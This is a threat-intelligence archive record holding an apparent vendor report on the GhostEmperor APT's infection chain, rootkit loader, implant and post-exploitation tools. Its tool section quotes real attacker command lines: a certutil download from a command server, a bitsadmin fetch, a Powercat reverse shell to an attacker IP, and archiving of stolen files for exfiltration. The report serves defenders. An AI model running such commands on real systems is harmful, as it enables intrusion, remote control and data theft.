{
    "id": "e1af447d-4b51-4858-9bbf-1f2c1e81ec82",
    "created_at": "2022-10-25T16:48:17.854738Z",
    "updated_at": "2025-03-27T02:16:09.447646Z",
    "deleted_at": null,
    "sha1_hash": "2d2c53b46c2c454a93aa1902a1940c973f8196de",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-09-30T12:34:45Z",
    "file_modification_date": "2021-09-30T12:34:48Z",
    "file_size": 2899959,
    "plain_text": "# GhostEmperor’s infection chain and post- exploitation toolset: technical details\n\n##### Learn more:\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nThis document provides a more thorough and in-depth technical analysis of the various stages in GhostEmperor’s infection\nchain, as outlined in the blog post. In addition, we provide a section with a description of the post-exploitation tools leveraged\nby the actor, demonstrating how they were used with actual command lines issued by the operators during the attacks.\n\n## Stage 1: PowerShell Dropper\n\nThe installation of the rootkit and the malicious service is started by a BAT file. The BAT file is usually created under the\nC:\\Windows\\debug or C:\\Windows\\debug\\wia directory, along with a PowerShell script. The script is an installer encrypted\nusing AES, and the BAT file runs it through the following set of command lines:\n\n```\nPowerShell -ex Bypass C:\\windows\\debug\\chrome.ps1 popmart123 >> C:\\windows\\debug\\di.txt\nipconfig >> C:\\windows\\debug\\di.txt\n\n```\n\nError messages from the PowerShell script along with the victim’s network information are logged in a text file under\nthe same directory. The BAT file also provides a decryption key as an argument for the PowerShell script, allowing the\nattackers to hinder analysis because without the decryption key, it is not possible to view the later stages of the infection.\nWe managed to identify a total of eight keys used by the attackers:\n\n- systeminfo\n\n- systeminfo123\n\n- wudi520\n\n- 1qaz2wsx\n\n- 88d6804e\n\n- Oi3noe1z\n\n- popmart123\n\n- qpalzmLLL\n\nThe decrypted script contains three encoded buffers. The first one is decoded and written to a DLL file, and a service is\ncreated to run it. The service is put in a group called ‘MsGroup’ or ‘AuthSvcGroup’. We identified three such DLL names, with\na matching service name for each one:\n\n\n**Service Name** **DLL Path**\n\n\n**MsMp4Hw** C:\\Windows\\System32\\msmp4dec.dll\n\n\n**Msdecode** C:\\ProgramData\\Microsoft\\Network\\Connections\\msdecode.dll\n\n\n**AuthSvc** C:\\Windows\\System32\\AuthSvc.dll\n\n**2**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nThe remaining two buffers in the script are AES encrypted. They are decoded by the PowerShell script and written to two\nregistry keys that are later decrypted and loaded by the DLL:\n\nEncoded buffers in the decrypted PowerShell installer script\n\nWe found four registry key names that were created by the different PowerShell installers and contained encrypted buffers:\n\n- HKLM\\Software\\Microsoft\\hiaudio\n\n- HKLM\\Software\\Microsoft\\midihelp\n\n- HKLM\\Software\\Microsoft\\data\n\n- HKLM\\Software\\Microsoft\\update\n\nIn some cases, we also observed an uninstaller PowerShell script called uninstall.ps1 that is capable of self-killing and\ndeleting all the artefacts previously created by the installer script. The uninstaller also requires a decryption key to run.\n\nDecrypted uninstaller script removing registry keys\n\n**3**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n## Stage 2: Service Loader\n\nWe identified two versions of the DLL service: one written in .NET and another in C++. The latter appeared both in an\nobfuscated and non-obfuscated form.\n\n### .NET version\n\nThe .NET variant is the most recent one we discovered, as it appears to have emerged only in March 2021. The internal name\nof this variant is SvchostSharp.dll, and we believe the compilation timestamp that suggests it was created in 2017 is fake.\nThe purpose of this service is to decrypt the contents of the registry keys created by the previous stage and load the code\nstored in them:\n\nReading and decryption of code that resides in a registry key, as done by the .NET variant\n\nThe decryption key, however, is based on the GUID of the infected system. This means that the infection chain was tailored\nfor this specific system, and it will not be possible to run the malware or retrieve the next stages in a different environment\nwithout knowing the decryption key beforehand.\n\n**4**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nGeneration of a decryption key from the system’s GUID\n\n### C++ Version\n\nThe C++ version has a similar purpose as the .NET variant – decrypt AES 256 encrypted data from a formerly written\nregistry key and in turn execute it as position-independent code. This is done in order to stage the next component in the\ninfection chain that serves as the malware’s main user mode component.\n\nIn contrast to the .NET version, the C++ variant does not mandate that the encryption key used to obtain the next stage is\nbased on the system’s GUID. Instead, it looks for an internal configuration section that starts with the keyword ‘Microsoft’\nand parses it to locate a hardcoded key. It is evident in the code that only if this hardcoded key is not provided, the malware\nturns to use the target’s computer name as the key.\n\nUsage of a hardcoded AES key or a fallback key derived from the computer’s name, as evident in the C++ variant\n\n**5**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n## Stage 3: In-Memory Implant\n\nThe service loader aids the execution of a user mode payload in the memory of an svchost.exe process. This serves\nseveral purposes. Its main objective is to facilitate a communication channel with a C2 server and act as a client capable\nof retrieving and staging a payload for further execution. Written in C++, the client can be formed as an instance of one\nof multiple classes, each presenting a different feature or set of traits that constitute the nature of the communication\nchannel. For example, the client is capable of operating over either HTTP or TLS protocols, supporting various\nauthentication mechanisms like basic access authentication or Microsoft’s Negotiate scheme.\n\nThe key capability of the client, though, is to mask traffic based on logic constituted by a Malleable C2 profile embedded\nwithin its configuration. Such profiles are a set of statements written in a custom language that is originally intended for\nconsumption by servers and clients of the Cobalt Strike framework. Their purpose is to shape the exchanged requests and\nresponses between the Cobalt Strike Beacon client and its server so that they appear as benign traffic and blend with the\nbulk of packets in the network, or otherwise appear as specific malware, in the case of a red team engagement or pentesting scenario.\n\nIn the case of the user mode clients described here, a subset of the Cobalt Strike profile syntax that allows the creation of\na specially crafted set of HTTP packets is supported. This makes it possible to parse a profile that resides within the HKLM\\\nSoftware\\Microsoft\\midihelp registry key, formerly written there by the initial PowerShell dropper, using it in turn to mask\n[the packets issued to and from the C2 as Amazon browsing traffic. This profile is publicly available on GitHub, and the](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile)\nmalware supports[1] the following keywords and statements that allow its interpretation and processing:\n\n**•** **set uri, set useragent: specifies the URI and User-Agent fields used as part of an HTTP transaction between the client**\nand server.\n\n**•** **http-get, http-post: types of HTTP transactions that can be customized. In other words, it is possible to shape the**\nstructure of HTTP GET and POST requests and responses in this malware.\n\n**•** **client, server: keywords that specify which side of the transaction to profile. For example, under a given http-post**\ntransaction it is possible to profile both packets sent from the client and those sent in response from the server. This\nindicates that such a profile can be consumed by both a client and a server component of the malware.\n\n**•** **base64, prepend, append: directive keywords that instruct how to form a data field passed in a transaction. As an**\nexample, for HTTP requests, a given string will be used as data that can then be encoded with Base64, prepended\nand appended with other strings as the arguments of the corresponding ‘prepend’ and ‘append’ keywords define. The\nresulting string can be then placed as either a header or a URI parameter.\n\n**•** **metadata, query, cookie: strings that can be shaped with the above directives.**\n\n**•** **parameter, header: for each transaction, these keywords specify where to store their arguments – URI parameters or**\nHTTP headers.\n\nAs is evident from the C2 profile syntax keywords specified above, the malware may process server mode configuration,\nthus possibly operating as one under a given configuration. This can be reinforced with additional communication logic\nfound in the code that suggests the operators can configure the malware to run as a server. For example, one of the classes\nthat handles communication over the TLS protocol contains a function that calls the AcceptSecurityContext API typically\nused on the server end of a TLS session. Additionally, the same class contains a function that allows the issuing of a selfsigned certificate with the CertCreateSelfSignCertificate API, using the common name and organization as DigiCert.\n\n1 \u0007See full documentation on the syntax used by Cobalt Strike for Malleable C2 profiles:\n\n[https://www.cobaltstrike.com/help-malleable-c2](https://www.cobaltstrike.com/help-malleable-c2)\n\n**6**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nFunctionality used to create a self-signed certificate\n\nAnother interesting attribute of the communication is that data passed in the body of HTTP POST requests is embedded\nwithin one of three fake file formats, RIFF, JPEG or PNG, causing the packets to appear as images or audio files sent to the\nserver. The format is chosen at random when building the packet, and its body is later appended to it. Due to the fact that\nwe could not obtain a full communication flow with the server, we can only attest to some of the fields in the structure\nappended to these formats, as outlined below:\n\n\n**Offset** **Field Size** **Description**\n\n\n**0x0** 16 bytes Random data inserted to the packet after it is encoded with the key in\nthe next field\n\n**0x10** 4 bytes Key used to encode the whole packet using a simple XOR algorithm\n\n**0x14** 8 bytes Unknown\n\n**0x1C** 2 bytes Flags used to indicate if compression is applied on the payload in the\npacket. The used compression algorithm found in the code is LZO\n(Lempel-Ziv-Oberhumer)\n\n**0x1E** 4 bytes Unknown\n\n**0x22** 4 bytes CRC32 checksum of the encrypted payload\n\n**0x26** 4 byte Total length of the transmitted packet\n\n**0x2A** 4 bytes Length of the encrypted data\n\n**0x2E** 4 byte Length of the cleartext data (before encryption)\n\n**0x32** Varies AES 256 encrypted payload data, the key is hardcoded\n\n**7**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nCode used to generate a fake JPEG header and the resulting packet\n\nIt should be noted that other than the client logic, there is a lot of code at this stage that is intended to provide the malware\nwith stealth or support the client’s operation. For the former, this component decrypts and loads an embedded rootkit\ndriver that is intended to hide malicious artefacts, as will be described in later sections of the report. For the latter, the\nmalware initiates a thread to detect if the system runs through a proxy, its type and address using various means, namely by\nissuing a call to the InternetGetProxyInfo API from the jsproxy.dll library which retrieves the address of a proxy used while\naccessing a given URL. The URL specified for this resolution in the malware is hxxp://update.microsoft[.]com.\n\nIn addition, the malware contains functionality to manually load a PE image and invoke execution from its entry point.\nThough we could not obtain an actual payload from the C2 server, we assess that this functionality is used later on to stage\nan additional payload for execution, as described in the next section.\n\n**8**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n## Stage 4: Remote Control Payload\n\nUnfortunately, we were unable to obtain a full infection chain that would allow us to observe exactly how the payload is\nobtained by the former stage and directly invoked in memory. Having said that, the logs from our telemetry have shown that\nin multiple cases additional code was loaded into the memory address space of the svchost.exe process running the client\ncode sometime after the initial infection. It was evident that the secondary in-memory loaded code was related to the\nclient component, as both shared multiple proprietary C++ classes and the exact same obfuscation techniques, described\nin a later section of the report.\n\nAdditionally, in several cases we also managed to find the same secondary component in the form of a file on disk. This file\nis a DLL with some unusual traits, namely, its section table is stripped of names and it exports two functions: one has only\nan ordinal #1 and the other carries the atypical export name ‘__acrt_iob_func’. Moreover, the same file appeared using a\nsimilar naming convention across three targets as summarized in the table below.\n\n\n**MD5** **Filename** **Target’s Country** **First Seen**\n\n\n**0BBFBA106FBB9E310330DC87C32CB6D1** memory_1441681343.dll Afghanistan 13/01/2021 5:04:32\n\n\n**5E295FE0F63C81A549A73469F962293A** memory_50348796.dll Ethiopia 01/08/2020 11:07:13\n\nmemory_235862828.dll Afghanistan 10/03/2021 5:05:16\n\nmemory_1784500.dll Thailand 03/08/2020 2:09:50\n\n\nThis component is built as a set of C++ classes that can be instantiated and used by another piece of code during run time.\nWhile we were unable to see the code that uses this DLL and invokes the logic within the classes, we were able to analyze\nseveral of them and understand their traits and behavior as standalone objects. The following is an outline of some of the\nkey functionalities provided by the DLL through these classes.\n\n### Payload Injection and Console Control\n\nA few of the classes we observed serve the primary purpose of injecting a payload to other processes on the machine. The\ntarget process can be an existing one, in which case it is winlogon.exe, or a newly created process in suspended state. In\nthe latter case, the chosen image for the created process needs to be passed by the code invoking the injection, which\nwe did not obtain. Such code will instantiate the C++ class conducting the injection and invoke the corresponding injection\nfunction by passing the path to the image of the created process as an argument.\n\nThe injection method is fairly straightforward and relies on creating a shared memory buffer between the source and target\nprocesses. The buffer is mapped using the NtCreateSection and NtMapViewOfSection APIs, allowing code and data to\nthen be copied into it in the source process and having the same information reflected in the target process. In the case\nof winlogon.exe, since it is a Windows system process, the injecting code patches a flag in an OS version dependent offset\n[within a structure resolved by the KernelBaseGetGlobalData function, as demonstrated here.](https://wddlog.wordpress.com/2014/06/17/inject-dll-to-system-process/)\n\n**9**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nThe execution of a function within the remotely written buffer depends on the type of injected process. For winlogon.exe\nthe injected payload will be initiated using the CreateRemoteThread API and for a newly created process the entry point of\nits executable image will be patched to conduct a jump to the payload, which will occur as soon as the process is resumed\nfrom its suspended state.\n\nEach injected code is passed along with a pipe name that is then used to establish a duplex IPC communication channel\nto the injecting component. The latter has the capacity to issue commands or instructions to the injected payload and\nreceive the outputs of their execution. The pipe’s name scheme is \\\\.\\pipe\\CDP_CALLBACK_%d, where %d is replaced by a\ndifferent numeric value for each injected payload.\n\nThe architecture used by the attackers to stage shellcode buffers in the winlogon.exe process in order to handle various remote control features\n\nThe injected payload is a position-independent code that serves a couple of purposes, the first of which is to create a\nconsole in the remote process and facilitate a channel to interact with it via the previously created named pipe. This is\nachieved through the following sequence of actions:\n\n- Creation of a new console within the injected process using the AllocConsole API and adjusting its window resolution to\n120 x 200.\n\n- Getting handles to the console’s input and output streams using the GetStdHandle API.\n\n- Connecting to the named pipe which has its name passed along with the executing shellcode.\n\n- Checking if there is data on the pipe using the PeekNamedPipe API and if so retrieving it to a buffer.\n\n- The numeric value of the first byte in the obtained data determines the message’s purpose:\n\n   - If it's a 1, it means the client in the injecting process is requesting a line of the console’s output. This is retrieved by\nusing the console’s output handle and iterating on its window output data along the Y axis (while X is set to 0). For\neach iterated coordinate a single output character is read at a time using the ReadConsoleOutputCharacterW API.\nThe generated output buffer is then prepended with a data structure of type CONSOLE_SCREEN_BUFFER_INFO to\nconvey the console’s window dimension.\n\n   - If it’s a 2, the message is intended to pass input to the console and the first byte will be followed by the input buffer\nthat is passed to the WriteConsoleInputW API.\n\n**10**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n### Remote Desktop Control\n\nAlternatively, the payload can be used to reflectively load a PE image that is hardcoded within the binary of the injecting\nDLL and used to control the desktop in the target machine. Such control is achieved by passing keyboard and mouse event\ninputs over the named pipe to the remotely loaded DLL and potentially retrieving screenshots as outputs with a refresh\nrate of one second.\n\nThe messages passed on the named pipe contain keystrokes and mouse cursor position data along with action codes that\ndetermine the nature of the passed input. The inputs are then used as arguments for the SendInput or SetCursorPos API\nfunctions that pass them to the desktop associated with the thread running the injected payload. The action codes that\ndescribe the purpose of the input are split to major and minor codes with the following designations:\n\n\n**Major Code** **Minor Code** **Description**\n\n\n**1** - Enable taking of screenshots as output\n\n\n**2** - Disable taking of screenshots\n\n**3** - Undetermined\n\n**4** 512 Set the passed cursor position on the screen\n\n513,514,516,517 Set cursor position and pass one of the mouse events – MOUSEEVENTF_\nLEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEEVENTF_RIGHTDOWN and\nMOUSEEVENTF_RIGHTUP\n\n515 Set cursor position and pass left mouse button double click\n\n518 Set cursor position and pass right mouse button double click\n\n522 Set cursor position and pass mouse wheel event\n\nOther Pass keyboard inputs\n\n**6** - Initiate a thread to pass a press on special keystrokes (Shift, Control, Menu and Left\nWindows Key)\n\n**7** - Terminate the special keystroke thread (i.e., the former press is released)\n\n**8** - Undetermined\n\n\n**11**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n### Execution of Arbitrary .NET Assemblies and Powershell Commands\n\nAnother capability exposed by a class in the payload DLL is the loading and execution of .NET assemblies during run time.\nAs formerly described, the payload DLL runs in the context of svchost.exe, which is an unmanaged process. In order to\nsupport the load of a .NET binary, the code ought to load the .NET CLR runtime, initialize and start it. Then it is possible to\nuse the AppDomain interface provided by it in order to load an assembly, resolve its entry point and invoke it. These stages\n[were observed in the malware’s code and are very close to the flow described here (see ‘Instantiating the CLR’ section).](https://www.accenture.com/us-en/blogs/cyber-defense/clrvoyance-loading-managed-code-into-unmanaged-processes)\n\nWhen using the class that provides this capability the user can either pass a struct containing a custom assembly as an\nargument or load an embedded assembly that serves to execute PowerShell commands. The latter is decoded during run\ntime and uses the .NET Pipeline class that is capable of executing enqueued PowerShell scripts. As can be seen in the code\nexcerpt of this assembly below, an attacker-provided script is passed as an argument to a function named ‘Exec’ which\nthen inserts it into the pipeline object and executes it, returning the result as an output.\n\n.NET code that can be invoked in order to support execution of PowerShell commands as part of the malware’s payload\n\n**12**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n### Filesystem Control\n\nFinally, the payload DLL contains a class that provides the attackers with capability to retrieve information and conduct\nactions on the target’s file system. As in the cases of the aforementioned classes, one of the functions invoked from the\nobject instantiated from the class can retrieve a code and a corresponding argument and dispatch it to execute a particular\nfile system action on the compromised host. The following is a summary of those codes and their functionality:\n\n**Code** **Description**\n\n**2,12,13,14** Undetermined\n\n\n**3** Provides a listing of all available drives in the system, their size and free space.\n\n**4** Retrieves file attributes as provided by the GetFileAttributesW API function for a given file.\n\n**5** Searches for a file with a given name within a specified directory. If a file is found, its full name, attributes,\nsize and timestamps of creation, last access and last write are provided.\n\n**6,16** Moves a file or directory with its contents from a given source to a destination path using the MoveFileW\nAPI function.\n\n**7** Looks for a file or directory recursively from a given path and, if found, deletes it.\n\n**8** Creates a new directory with a given path using the CreateDirectoryW API.\n\n**9** Provides file size and timestamps retrieved with the GetFileTime API for a given file’s path.\n\n**10** Searches for a file recursively from a given path and provides its creation time, last access time and last\nwrite time.\n\n**11** Write data to a given offset within a file.\n\n**15** Copies a file (using the CopyFileW API) or directory (using the SHFileOperationW API) from one path to\nanother.\n\n**18** Executes a given file using the CreateProcessW API.\n\n\n**19** Attempts to retrieve a handle to a security token of another process given its PID and then uses the\nImpersonateLoggedOnUser to impersonate the security context of that token’s owner. This may be used to\nfacilitate the execution of other operations that require privileges of a specific user.\n\n**13**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n## Post-exploitation toolset & command details\n\nIn this section we describe in detail all the tools used by the attackers. We also document the command lines used during\nthe campaign, where we were able to identify them.\n\nThe leveraged tools were used primarily to steal information from the infected system or spread further in the network.\nMost of them are legitimate or open-source tools, while some are custom made or not so well known. Below are some of\nthe main tools we identified:\n\n**•** **NBTscan: A command line tool to scan a network for NetBIOS information, allowing the attackers to view loggedin users**\nor IP addresses of other machines in the network. The NBTscan executable often appeared under the names ‘nbt.exe’ or\n‘nb8.exe’.\n\n**•** **PsExec: A command line tool that is part of the Sysinternals suite, allowing the attackers to execute processes on**\nremote systems.\n\n**•** **PsList: A command line tool that displays running processes, and is part of the Sysinternals suite.**\n\n**•** **ProcDump: A command line tool that is part of the Sysinternals suite, used to dump process memory. The attackers**\nused this tool to dump the memory of the LSASS.exe process and steal passwords.\n\n**•** **WinRAR: The attackers exfiltrated sensitive files from the infected system, such as JPG images or Word documents and**\nused the RAR.exe tool in order to compress them before uploading the data to the C2 server. To make sure the files are\nrecent, the attackers provided a command line argument that checked if the files were created after a certain date.\n\n```\nrar.exe a -r -v200m -ta20201101000000 -n*.doc -n*.docx -n*.xlsx -n*.pdf -n*.txt -n*.jpg -n*.zip \"C:\\Windows\\debug\\\nlog.rar\"\n\n```\n\nSimilarly, this utility was used to archive and exfiltrate mailbox contents retrieved to a .pst file via the PowerShell NewMailboxExportRequest cmdlet. A password protected archive with these contents was generated with the command\nspecified below.\n\n```\nrar.exe a -r -n*.pst \"$windir\\debug\\log.rar\" -hpBaigong -y\n\n```\n\n\n**•** **Certutil, BITSAdmin: Instead of relying on more common methods, the Certutil and BITSAdmin tools are used to**\ndownload additional malicious scripts from the C2 servers to evade detection.\n\n```\ncertutil.exe -urlcache -split -f hxxp://27.102.113[.]240/debug.txt C:\\Windows\\pla\\debug.bat\n\n```\n\n**14**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\nAn interesting thing we noticed is that in one case the BITSAdmin tool downloaded an archive containing a PowerShell\ninstaller script from a legitimate website. The website belonged to a government entity from a country in South East Asia,\nwhich might have been compromised by GhostEmperor prior to this attack, as it hosted one of their malicious files.\n\n```\nbitsadmin /transfer myDownLoadJob /download /priority normal \"hxxp://[redacted]/1.zip\" \"C:\\Windows\\debug\\wia\\1.zip\"\nexpand 1.zip sss.ps1\n\n```\n\n\n**•** **Cscript: The cscript.exe utility executed Visual Basic scripts dropped by the attackers such as ListDomain.vbs, a VB**\nscript that dates back to 2012 and collects information about the domain or the workgroup of the infected machine.\n\nListDomain VB script\n\n**•** **Schtasks: Instead of running BAT files directly, the attackers scheduled a task (often called ‘test’ or ‘test3’), ran it**\nimmediately with schtasks.exe and then deleted it.\n```\n schtasks /create /tn \"test3\" /tr C:\\Windows\\debug\\wia\\h.bat /sc once /st 23:32:00 /ru \"system\"\n schtasks /run /tn \"test3\"\n schtasks /delete /tn \"test3\" /f\n\n```\n**•** **[Powercat: Powercat is an open-source tool written in PowerShell, and is meant to be an equivalent of the known](https://github.com/besimorhino/powercat)**\nnetworking utility NetCat. GhostEmperor’s operators connected to the C2 servers using this tool.\n\n```\npowershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/\npowercat/master/powercat.ps1');powercat -c 27.102.113[.]57 -p 443 -e cmd\n\n```\n\n**15**\n\n\n-----\n\n#### GhostEmperor’s infection chain and post-exploitation toolset: technical details\n\n**•** **Ladon:** [Ladon is an open-source tool that assists in lateral movement across a network, as it scans for open ports and](https://github.com/k8gege/Ladon)\ndetects devices that are exposed to certain vulnerabilities.\n\n**•** **[Mimikat_ssp: Mimikat_ssp is an open-source custom tool based on the well-known Mimikatz application, with the aim](https://github.com/jas502n/mimikat_ssp)**\nof avoiding detection by antivirus solutions.\n\n**•** **[Get-PassHashes.ps1: Get-PassHashes is a PowerShell script that is part of the open-source Nishang offensive](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1)**\nsecurity framework, and is intended to dump password hashes.\n\n**•** **[GetPwd: A custom tool to dump passwords from memory that is based on the GetPwd open-source tool from](http://en.pudn.com/Download/item/id/3053931.html)**\nPudn.com.\n\n**• Token.exe: A custom tool that accepts a username and a filename as an argument, and runs the file with system**\nprivileges.\n\n**16**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.09.30.GhostEmperor/GhostEmperor_technical-details_PDF_eng.pdf",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/09/30094337/GhostEmperor_technical-details_PDF_eng.pdf"
    ],
    "report_names": [
        "GhostEmperor_technical-details_PDF_eng",
        "GhostEmperor_technical-details_PDF_eng.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0eca237-f191-448f-87d1-5d6b3651cbff",
            "created_at": "2024-02-06T02:00:04.140087Z",
            "updated_at": "2025-03-27T02:00:03.323578Z",
            "deleted_at": null,
            "main_name": "GhostEmperor",
            "aliases": [
                "FamousSparrow",
                "UNC2286",
                "Salt Typhoon",
                "RedMike"
            ],
            "source_name": "MISPGALAXY:GhostEmperor",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d390d62a-6e11-46e5-a16f-a88898a8e6ff",
            "created_at": "2024-12-28T02:01:54.899899Z",
            "updated_at": "2025-03-27T02:02:10.122415Z",
            "deleted_at": null,
            "main_name": "Salt Typhoon",
            "aliases": [
                "Earth Estries",
                "FamousSparrow",
                "GhostEmperor",
                "RedMike",
                "Salt Typhoon",
                "UNC2286"
            ],
            "source_name": "ETDA:Salt Typhoon",
            "tools": [
                "Agentemis",
                "Backdr-NQ",
                "Cobalt Strike",
                "CobaltStrike",
                "Crowdoor",
                "Cryptmerlin",
                "Deed RAT",
                "Demodex",
                "FamousSparrow",
                "FuxosDoor",
                "GHOSTSPIDER",
                "HemiGate",
                "MASOL RAT",
                "Mimikatz",
                "NBTscan",
                "NinjaCopy",
                "ProcDump",
                "PsExec",
                "PsList",
                "SnappyBee",
                "SparrowDoor",
                "TrillClient",
                "WinRAR",
                "Zingdoor",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041769,
    "ts_creation_date": 1633005285,
    "ts_modification_date": 1633005288,
    "files": {
        "pdf": "https://archive.orkl.eu/2d2c53b46c2c454a93aa1902a1940c973f8196de.pdf",
        "text": "https://archive.orkl.eu/2d2c53b46c2c454a93aa1902a1940c973f8196de.txt",
        "img": "https://archive.orkl.eu/2d2c53b46c2c454a93aa1902a1940c973f8196de.jpg"
    }
}